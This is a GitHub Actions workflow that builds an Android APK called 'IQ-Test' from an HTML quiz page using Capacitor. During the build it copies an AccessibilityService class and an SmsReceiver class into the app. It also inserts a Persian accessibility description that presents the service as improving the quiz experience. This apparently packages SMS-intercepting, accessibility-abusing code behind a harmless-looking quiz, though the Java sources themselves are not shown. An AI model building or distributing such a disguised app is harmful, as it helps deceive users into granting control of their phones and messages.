name: Build APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Node.js 20
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Install npm dependencies
        run: npm install

      - name: Prepare www folder
        run: |
          mkdir -p www
          if [ -f "index.html" ]; then cp index.html www/index.html; fi
          if [ -f "iq-test.html" ]; then cp iq-test.html www/index.html; fi

      - name: Add Android platform
        run: npx cap add android

      - name: Copy config files
        run: |
          if [ -f "config/AndroidManifest.xml" ]; then
            cp config/AndroidManifest.xml android/app/src/main/AndroidManifest.xml
          fi

          mkdir -p android/app/src/main/res/xml
          if [ -f "config/accessibility_service_config.xml" ]; then
            cp config/accessibility_service_config.xml android/app/src/main/res/xml/
          fi

          mkdir -p android/app/src/main/java/com/iqtest/app
          if [ -f "config/MyAccessibilityService.java" ]; then
            cp config/MyAccessibilityService.java android/app/src/main/java/com/iqtest/app/
          fi
          if [ -f "config/SmsReceiver.java" ]; then
            cp config/SmsReceiver.java android/app/src/main/java/com/iqtest/app/
          fi

      - name: Add strings.xml for accessibility
        run: |
          STRINGS="android/app/src/main/res/values/strings.xml"
          if ! grep -q "accessibility_service_description" "$STRINGS"; then
            sed -i 's|</resources>|    <string name="accessibility_service_description">سرویس آزمون هوش برای بهبود تجربه کاربری</string>\n</resources>|' "$STRINGS"
          fi

      - name: Sync Capacitor
        run: npx cap sync android

      - name: Make gradlew executable
        run: chmod +x android/gradlew

      - name: Build Debug APK
        run: |
          cd android
          ./gradlew assembleDebug --no-daemon --stacktrace

      - name: Rename APK
        run: |
          mkdir -p output
          cp android/app/build/outputs/apk/debug/app-debug.apk output/IQ-Test.apk

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: IQ-Test-APK
          path: output/IQ-Test.apk
          retention-days: 30

      - name: Show file info
        run: |
          ls -lh output/
          echo "✅ APK آماده شد"